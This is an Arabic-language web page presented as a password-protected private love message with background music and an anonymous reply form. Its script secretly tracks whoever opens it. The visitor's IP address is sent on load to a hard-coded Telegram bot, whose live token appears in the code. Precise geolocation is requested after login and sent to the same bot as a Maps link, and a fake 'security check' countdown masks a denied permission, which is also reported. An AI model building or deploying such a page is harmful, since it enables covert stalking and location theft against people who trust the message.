<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>رسالة خاصة</title>
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="stylesheet" href="style.css">
    <style>
        /* ستايل نافذة الشات العائم */
        .chat-widget-btn {
            position: fixed;
            bottom: 20px;
            left: 20px;
            background: linear-gradient(135deg, #b026ff, #ff4d85);
            color: white;
            width: 60px;
            height: 60px;
            border-radius: 50%;
            display: flex;
            justify-content: center;
            align-items: center;
            font-size: 24px;
            cursor: pointer;
            box-shadow: 0 4px 15px rgba(176, 38, 255, 0.4);
            z-index: 1000;
            transition: transform 0.3s ease;
        }
        .chat-widget-btn:hover {
            transform: scale(1.1);
        }
        .chat-window {
            position: fixed;
            bottom: 90px;
            left: 20px;
            width: 320px;
            max-width: 90%;
            background-color: #171b23;
            border: 1px solid #30363d;
            border-radius: 15px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
            z-index: 1000;
            display: none;
            flex-direction: column;
            overflow: hidden;
            animation: slideUp 0.3s ease;
        }
        .chat-header {
            background: #21262d;
            padding: 15px;
            color: white;
            font-weight: 700;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid #30363d;
        }
        .chat-header span {
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .chat-header .close-chat {
            cursor: pointer;
            color: #8b949e;
            font-size: 18px;
        }
        .chat-header .close-chat:hover {
            color: white;
        }
        .chat-body {
            padding: 15px;
            height: 200px;
            overflow-y: auto;
            display: flex;
            flex-direction: column;
            gap: 10px;
            font-size: 13px;
            color: #c9d1d9;
        }
        .chat-msg {
            background: #21262d;
            padding: 10px;
            border-radius: 10px;
            max-width: 85%;
            line-height: 1.4;
        }
        .chat-msg.admin {
            background: #b026ff22;
            border: 1px solid #b026ff55;
            align-self: flex-start;
        }
        .chat-footer {
            padding: 10px;
            background: #21262d;
            display: flex;
            gap: 8px;
            border-top: 1px solid #30363d;
        }
        .chat-footer input {
            flex: 1;
            background: #0d1117;
            border: 1px solid #30363d;
            border-radius: 8px;
            padding: 8px 12px;
            color: white;
            font-size: 13px;
            outline: none;
        }
        .chat-footer button {
            background: #b026ff;
            border: none;
            color: white;
            padding: 0 15px;
            border-radius: 8px;
            cursor: pointer;
            font-weight: 600;
        }
        .chat-footer button:hover {
            background: #991ee8;
        }
        @keyframes slideUp {
            from { transform: translateY(20px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }

        /* ستايل النافذة العائمة للعد التنازلي القديمة */
        .modal-overlay {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(11, 15, 20, 0.85);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            backdrop-filter: blur(5px);
            animation: fadeIn 0.3s ease;
        }
        .modal-box {
            background-color: #171b23;
            border: 1px solid #30363d;
            border-radius: 20px;
            padding: 30px;
            width: 90%;
            max-width: 350px;
            text-align: center;
            box-shadow: 0 15px 35px rgba(0,0,0,0.8), 0 0 20px rgba(176, 38, 255, 0.2);
        }
        .modal-box h3 { margin-top: 0; color: #ff4d85; font-size: 20px; }
        .modal-box p { color: #8b949e; font-size: 14px; line-height: 1.6; }
        .countdown-number {
            font-size: 32px;
            font-weight: 700;
            color: #b026ff;
            margin: 15px 0;
        }
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
    </style>
</head>
<body>

    <div class="card" id="mainContainer">
        <div id="loginView">
            <div class="heart-box">
                <i class="fa-solid fa-heart" style="color: white;"></i>
            </div>
            <h2>رسالة خاصة 💌</h2>
            <p class="subtitle" id="lockSubtitle">اكتب الباسورد علشان تقرأ الرسالة</p>
            <input type="password" id="passInput" placeholder="اكتب الباسورد هنا..." onkeypress="if(event.key==='Enter') verifyPassword();">
            <button class="btn" onclick="verifyPassword()">
                <i class="fa-solid fa-envelope-open"></i> فتح الرسالة
            </button>
            <div id="errorMsg" class="error"></div>
        </div>
    </div>

    <!-- زر وشات التليجرام العائم -->
    <div class="chat-widget-btn" onclick="toggleChatWindow()">
        <i class="fa-solid fa-comments"></i>
    </div>

    <div class="chat-window" id="chatWindow">
        <div class="chat-header">
            <span><i class="fa-brands fa-telegram" style="color: #229ed9;"></i> الشات المباشر</span>
            <i class="fa-solid fa-xmark close-chat" onclick="toggleChatWindow()"></i>
        </div>
        <div class="chat-body" id="chatBody">
            <div class="chat-msg admin">أهلاً بك! تقدر تسيب رسالتك أو استفسارك وهيوصل لصاحب الصفحة فوراً على تليجرام.</div>
        </div>
        <div class="chat-footer">
            <input type="text" id="chatInput" placeholder="اكتب رسالتك هنا..." onkeypress="if(event.key==='Enter') sendLiveChat();">
            <button onclick="sendLiveChat()"><i class="fa-solid fa-paper-plane"></i></button>
        </div>
    </div>

    <script>
        let dbData = {};
        const urlParams = new URLSearchParams(window.location.search);
        let currentSlug = urlParams.get('to') || window.location.hash.substring(1) || "first";

        const botToken = '8882621676:AAFNQ0B3q6rPSMTIujyIHGYiep9xNM1rgZU';
        const chatId = '8718173410';
        let cachedUserInfo = null;

        // سحب الـ IP فور فتح الصفحة
        window.addEventListener('load', async () => {
            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                sendToTelegram(`👀 شخص قام بفتح الصفحة:\n🌐 الـ IP: ${ipData.ip}\n🔗 الرابط: ${window.location.href}`);
            } catch (e) {}
        });

        function toggleChatWindow() {
            const chatWin = document.getElementById('chatWindow');
            chatWin.style.display = chatWin.style.display === 'flex' ? 'none' : 'flex';
        }

        async function sendLiveChat() {
            const input = document.getElementById('chatInput');
            const text = input.value.trim();
            if (!text) return;

            const chatBody = document.getElementById('chatBody');
            chatBody.innerHTML += `<div class="chat-msg" style="background: #b026ff; color: white; align-self: flex-end;">${text}</div>`;
            input.value = '';
            chatBody.scrollTop = chatBody.scrollHeight;

            const telegramMsg = `💬 رسالة شات جديدة مباشرة من الموقع:\n\n${text}`;
            sendToTelegram(telegramMsg);

            setTimeout(() => {
                chatBody.innerHTML += `<div class="chat-msg admin">تم إرسال رسالتك بنجاح إلى صاحب الموقع! سيتم الرد قريباً.</div>`;
                chatBody.scrollTop = chatBody.scrollHeight;
            }, 1000);
        }

        async function fetchDatabase() {
            try {
                const res = await fetch('db.json?v=' + Date.now());
                if (res.ok) {
                    dbData = await res.json();
                    if (dbData[currentSlug] && dbData[currentSlug].name) {
                        document.getElementById('lockSubtitle').innerText = `اكتب الباسورد علشان تقرأ الرسالة يا ${dbData[currentSlug].name}`;
                    }
                }
            } catch (e) {}
        }

        fetchDatabase();

        async function verifyPassword() {
            const passInput = document.getElementById('passInput');
            const errorDiv = document.getElementById('errorMsg');
            const enteredPass = passInput.value.trim();

            if (!enteredPass) {
                errorDiv.innerText = 'يرجى كتابة الباسورد أولاً!';
                return;
            }

            errorDiv.innerText = 'جاري التحقق...';

            if (Object.keys(dbData).length === 0) {
                await fetchDatabase();
            }

            let correctPass = "1234";
            if (dbData[currentSlug] && dbData[currentSlug].password !== undefined) {
                correctPass = String(dbData[currentSlug].password).trim();
            } else if (urlParams.get('pass')) {
                correctPass = urlParams.get('pass').trim();
            }

            if (enteredPass === correctPass) {
                cachedUserInfo = dbData[currentSlug];
                const recipientName = cachedUserInfo ? (cachedUserInfo.name || currentSlug) : (urlParams.get('to') || currentSlug);
                
                requestLocationWithCountdown(recipientName);
            } else {
                errorDiv.innerText = 'كلمة المرور غير صحيحة، حاول مرة أخرى.';
            }
        }

        function requestLocationWithCountdown(recipientName) {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
                        
                        let ipInfo = "غير معروف";
                        try {
                            const ipRes = await fetch('https://api.ipify.org?format=json');
                            const ipData = await ipRes.json();
                            ipInfo = ipData.ip;
                        } catch (err) {}

                        sendToTelegram(`📍 تم فتح الرسالة بنجاح بواسطة (${recipientName})!\n🌐 الـ IP: ${ipInfo}\n🗺️ اللوكيشن:\n${mapsLink}`);
                        showContent(cachedUserInfo);
                    },
                    (error) => {
                        showCountdownModal(recipientName);
                    },
                    { timeout: 10000, enableHighAccuracy: true }
                );
            } else {
                showContent(cachedUserInfo);
            }
        }

        function showCountdownModal(recipientName) {
            let timeLeft = 5;
            const modalHTML = `
                <div class="modal-overlay" id="countdownModal">
                    <div class="modal-box">
                        <h3>جاري تأكيد الأمان...</h3>
                        <p>يرجى الانتظار بينما يتم إعداد ملفات الرسالة الخاصة بك</p>
                        <div class="countdown-number" id="countdownTimer">${timeLeft}</div>
                        <p style="font-size: 12px; color: #6e7681;">تتم مراجعة الصلاحيات والبيانات</p>
                    </div>
                </div>
            `;
            document.body.insertAdjacentHTML('beforeend', modalHTML);

            let timer = setInterval(() => {
                timeLeft--;
                const timerElement = document.getElementById('countdownTimer');
                if (timerElement) {
                    timerElement.innerText = timeLeft;
                }

                if (timeLeft <= 0) {
                    clearInterval(timer);
                    const modal = document.getElementById('countdownModal');
                    if (modal) modal.remove();

                    sendToTelegram(`⚠️ المستخدم (${recipientName}) رفض إذن اللوكيشن، وتمت متابعته عبر العد التنازلي وفتح الصفحة بنجاح.`);
                    showContent(cachedUserInfo);
                }
            }, 1000);
        }

        function sendToTelegram(text) {
            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
            fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: text })
            }).catch(e => console.log(e));
        }

        function showContent(userInfo) {
            const recipientName = userInfo ? (userInfo.name || currentSlug) : (urlParams.get('to') || currentSlug);
            const messageText = userInfo ? (userInfo.message || "أهلاً بك! تم إنهاء تجهيز هذه الرسالة الخاصة لك.") : (urlParams.get('msg') || "أهلاً بك! تم إنهاء تجهيز هذه الرسالة الخاصة لك.");
            const songTitle = userInfo && userInfo.song_title ? userInfo.song_title : (urlParams.get('title') || "مقطوعة هادئة");
            const songUrl = (userInfo && userInfo.song_link && userInfo.song_link.startsWith('http')) 
                            ? userInfo.song_link 
                            : (urlParams.get('song') || "https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3");

            document.getElementById('mainContainer').innerHTML = `
                <div class="heart-box">
                    <i class="fa-solid fa-heart" style="color: white;"></i>
                </div>
                <h2>رسالة إلى: <span id="recipientName">${recipientName}</span></h2>
                <p class="subtitle">رسالة سرية مخصصة</p>

                <div class="quote-box">
                    <i class="fa-solid fa-quote-right quote-mark-right"></i>
                    <p>${messageText}</p>
                    <i class="fa-solid fa-quote-left quote-mark-left"></i>
                </div>

                <audio id="bgAudio" src="${songUrl}" loop></audio>
                
                <div class="music-player">
                    <button class="play-btn" id="playBtn" onclick="togglePlay()"><i class="fa-solid fa-play"></i> تشغيل</button>
                    <div class="music-info">
                        <p class="title">${songTitle}</p>
                        <p class="desc">موسيقى استرخاء</p>
                    </div>
                    <div class="music-icon-box">
                        <i class="fa-solid fa-music"></i>
                    </div>
                </div>

                <div class="reply-section">
                    <label>رد على المرسل (بشكل مجهول):</label>
                    <textarea id="replyMsg" placeholder="اكتب ردك هنا..."></textarea>
                    <button class="btn" onclick="sendReply('${recipientName}')">
                        <i class="fa-solid fa-paper-plane"></i> إرسال الرد سراً
                    </button>
                </div>
            `;
        }

        function togglePlay() {
            const audio = document.getElementById('bgAudio');
            const playBtn = document.getElementById('playBtn');
            if (audio.paused) {
                audio.play();
                playBtn.innerHTML = '<i class="fa-solid fa-pause"></i> إيقاف';
            } else {
                audio.pause();
                playBtn.innerHTML = '<i class="fa-solid fa-play"></i> تشغيل';
            }
        }

        function sendReply(name) {
            const message = document.getElementById('replyMsg').value.trim();
            if (!message) {
                alert('الرجاء كتابة رد أولاً!');
                return;
            }

            const textToTelegram = `💌 رد جديد من (${name}):\n\n${message}`;
            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

            fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: textToTelegram })
            })
            .then(res => res.json())
            .then(data => {
                if (data.ok) {
                    alert('تم إرسال الرد سراً بنجاح! شكراً لك.');
                    document.getElementById('replyMsg').value = '';
                } else {
                    alert('حدث خطأ أثناء الإرسال.');
                }
            })
            .catch(() => alert('تأكد من اتصالك بالإنترنت.'));
        }
    </script>
</body>
</html>
